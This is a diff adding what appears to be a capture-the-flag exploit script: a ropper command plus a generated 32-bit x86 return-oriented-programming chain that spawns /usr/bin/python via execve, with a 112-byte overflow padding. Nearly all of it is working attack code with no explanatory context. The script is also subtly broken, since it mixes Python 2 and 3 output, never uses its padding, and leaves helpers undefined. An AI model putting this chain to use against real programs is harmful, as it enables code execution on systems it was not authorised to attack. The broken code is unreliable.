@@ -1,0 +1,63 @@
+ropper -f rop --chain "execve cmd=/usr/bin/python" --badbytes 000a0d09ff  > chain.py
+
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += '//us'
+rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
+rop += rebase_0(0x00091060)
+rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += 'r/bi'
+rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
+rop += rebase_0(0x00091064)
+rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += 'n/py'
+rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
+rop += rebase_0(0x00091068)
+rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += 'thon'
+rop += rebase_0(0x00082b38) # 0x080cab38: pop eax; push cs; or al, 0x41; ret; 
+rop += rebase_0(0x0009106c)
+rop += rebase_0(0x00033cca) # 0x0807bcca: mov dword ptr [eax], edx; pop ebx; pop esi; pop edi; ret; 
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += p(0xdeadbeef)
+rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += rebase_0(0x00091070)
+rop += rebase_0(0x0000e915) # 0x08056915: mov dword ptr [edx], eax; ret; 
+rop += rebase_0(0x00026882) # 0x0806e882: pop ecx; pop ebx; ret; 
+rop += rebase_0(0x00091070)
+rop += p(0xdeadbeef)
+rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
+rop += rebase_0(0x00091060)
+rop += rebase_0(0x0002685b) # 0x0806e85b: pop edx; ret; 
+rop += rebase_0(0x00091070)
+rop += rebase_0(0x0000ded0) # 0x08055ed0: xor eax, eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00033cea) # 0x0807bcea: inc eax; ret; 
+rop += rebase_0(0x00027190) # 0x0806f190: int 0x80; ret; 
+print rop
+
+buffer   = b'\x41' * 112
+
+sys.stdout.buffer.write(rop)
